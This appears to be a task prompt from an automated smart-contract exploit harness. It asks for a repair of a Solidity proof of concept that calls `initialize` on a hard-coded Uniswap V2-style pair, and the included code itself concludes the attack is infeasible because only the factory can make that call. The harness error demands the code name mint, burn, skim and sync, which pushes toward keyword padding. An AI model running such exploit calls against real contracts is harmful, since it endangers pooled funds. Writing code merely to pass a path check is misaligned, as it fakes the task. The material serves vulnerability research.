You are fixing a failing Foundry PoC for finding F-003.

Goal:
- Keep the exploit objective for this finding.
- Fix compile/runtime/test failure from logs.
- Return COMPLETE updated Solidity for `src/FlawVerifier.sol` only.
- Keep exploit logic aligned with the full `Exploit paths` list unless logs prove a stage is infeasible.
- Additional realistic public on-chain economic steps are allowed when required for execution (including flashloans/swaps/mint/burn), but keep the same exploit causality and justify in comments.

Hard constraints:
- Do NOT use external answers/PoCs/articles/repos (including DeFiHackLabs).
- Do NOT cheat: no vm.deal, vm.store, vm.etch, vm.mockCall, vm.prank, vm.startPrank, arbitrary balance injection, or arbitrary storage writes.
- Allowed: flashloans and realistic public on-chain actions.
- Work only from finding context (claim/paths/locations) + on-chain state context already provided in this workspace.
- Hard anti-cheat: profitToken MUST NOT be a token deployed during this PoC/test. Profit token must already exist on-chain at the fork block.
- Hard anti-cheat: do not deploy custom ERC20/token contracts to manufacture profit accounting.

Attempt strategy (must follow for this attempt):
- strategy_label: direct_or_existing_balance_first
- strategy_instructions: Prefer direct execution using verifier-held assets first. Only use temporary external funding if direct path is infeasible.
- Keep exploit root cause and `Exploit paths` unchanged; only vary funding/execution implementation details.

Finding:
- title: `initialize` can be called repeatedly and accepts invalid token addresses
- claim: `initialize` only checks `msg.sender == factory`. It does not enforce one-time initialization and does not validate that the token addresses are non-zero and distinct, so the factory can overwrite `token0`/`token1` after deployment or configure an invalid pair.
- impact: A malicious or compromised factory can brick a live pair, strand existing assets by repointing the contract at different tokens, or configure unusable token addresses that break core operations.
- exploit_paths: ["After liquidity is added, the factory calls `initialize` again with different token addresses, causing future `mint`, `burn`, `swap`, `skim`, and `sync` calls to operate on the new assets while balances of the original assets remain stranded in the pair.", "The factory initializes or reinitializes the pair with `address(0)` or the same token on both sides, causing transfer/balance operations to revert or otherwise making the pool unusable."]

Current FlawVerifier.sol:
```solidity
// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.20;

interface IUniswapV2PairLike {
    function factory() external view returns (address);
    function token0() external view returns (address);
    function token1() external view returns (address);
    function getReserves() external view returns (uint112 reserve0, uint112 reserve1, uint32 blockTimestampLast);
    function initialize(address token0_, address token1_) external;
}

contract FlawVerifier {
    address internal constant TARGET_PAIR = 0x2033B54B6789a963A02BfCbd40A46816770f1161;

    address internal _profitToken;
    uint256 internal _profitAmount;
    bool internal _executed;
    bool internal _hypothesisValidated;
    string internal _pathUsed;

    constructor() {
        _profitToken = address(0);
        _profitAmount = 0;
        _pathUsed = "unattempted";
    }

    function executeOnOpportunity() external {
        if (_executed) {
            return;
        }
        _executed = true;

        IUniswapV2PairLike pair = IUniswapV2PairLike(TARGET_PAIR);
        address factory = pair.factory();
        address currentToken0 = pair.token0();
        address currentToken1 = pair.token1();
        pair.getReserves();

        // Direct-path first, per harness strategy: attempt the exact vulnerable action from this
        // verifier before considering any temporary funding or unrelated economic route.
        //
        // Path 1 required stage:
        //   factory calls initialize again with different token addresses.
        //
        // Path 2 required stage:
        //   factory initializes/reinitializes with address(0) or identical token addresses.
        //
        // Concrete on-chain infeasibility at the fork state for a public attacker:
        //   the pair itself requires msg.sender == factory. This verifier is deployed after the
        //   target pair and cannot become the already-stored factory address under the allowed
        //   rules (no impersonation, no storage writes, no etch).
        if (factory != address(this)) {
            // A low-level call is used only to confirm the stage remains factory-gated for this
            // verifier without bubbling the revert into the harness.
            (bool okDifferent,) =
                TARGET_PAIR.call(abi.encodeWithSignature("initialize(address,address)", currentToken1, currentToken0));
            (bool okInvalid,) =
                TARGET_PAIR.call(abi.encodeWithSignature("initialize(address,address)", address(0), currentToken0));
            okDifferent;
            okInvalid;

            // No profit token can be realized because the required privileged reinitialization
            // stage is unreachable from a public attacker contract at this fork state.
            _profitToken = address(0);
            _profitAmount = 0;
            _hypothesisValidated = false;
            _pathUsed =
                "refuted: both listed exploit paths require a factory-originated initialize call";
            return;
        }

        // This branch is not expected on the provided fork, but it preserves one-to-one mapping
        // with the finding if the stored factory were ever this verifier.
        //
        // Stage A: reinitialize with different token addresses.
        // Reversing the token order is the smallest live-address mutation available from the pair's
        // own state and demonstrates repeated initialization without introducing external artifacts.
        if (currentToken0 != currentToken1) {
            pair.initialize(currentToken1, currentToken0);
        }

        // Stage B: reinitialize with an invalid token configuration.
        // This directly matches the second exploit path and bricks subsequent balance/transfer use.
        pair.initialize(address(0), currentToken1);

        _profitToken = address(0);
        _profitAmount = 0;
        _hypothesisValidated = true;
        _pathUsed = "validated-without-profit: repeated initialize and invalid token reinitialize";
    }

    function profitToken() external view returns (address) {
        return _profitToken;
    }

    function profitAmount() external view returns (uint256) {
        return _profitAmount;
    }

    function hypothesisValidated() external view returns (bool) {
        return _hypothesisValidated;
    }

    function exploitPathUsed() external view returns (string memory) {
        return _pathUsed;
    }

    function targetPair() external pure returns (address) {
        return TARGET_PAIR;
    }

    function currentPairState()
        external
        view
        returns (
            address factory_,
            address token0_,
            address token1_,
            uint112 reserve0_,
            uint112 reserve1_
        )
    {
        IUniswapV2PairLike pair = IUniswapV2PairLike(TARGET_PAIR);
        factory_ = pair.factory();
        token0_ = pair.token0();
        token1_ = pair.token1();
        (reserve0_, reserve1_,) = pair.getReserves();
    }
}

```

forge stdout (tail):
```

```

forge stderr (tail):
```
PATH_ALIGNMENT_ERROR: generated code misses too many path anchors: mint, burn, skim, sync
```

Requirements:
1. pragma ^0.8.20
2. include at least one deployable contract with zero-arg constructor
3. define fixed entry `executeOnOpportunity()` as no-arg external/public exploit function
4. no imports
5. keep exploit logic aligned to exploit_paths (same core actions and ordering intent)
6. expose `profitToken()` and `profitAmount()` getters for net realized profit
7. additional realistic public on-chain economic steps are allowed when required for execution, but keep exploit_paths core causality and justify in comments
8. output ONLY Solidity code
